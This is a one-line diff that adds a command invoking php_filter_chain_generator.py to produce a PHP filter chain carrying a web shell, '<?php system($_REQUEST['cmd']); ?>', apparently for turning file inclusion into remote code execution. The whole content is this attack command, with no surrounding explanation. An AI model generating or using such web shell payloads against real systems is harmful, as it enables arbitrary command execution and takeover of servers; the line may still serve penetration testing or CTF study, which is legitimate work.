@@ -1,0 +1,1 @@
+php_filter_chain_generator.py --chain '<?php system($_REQUEST['cmd']); ?>'
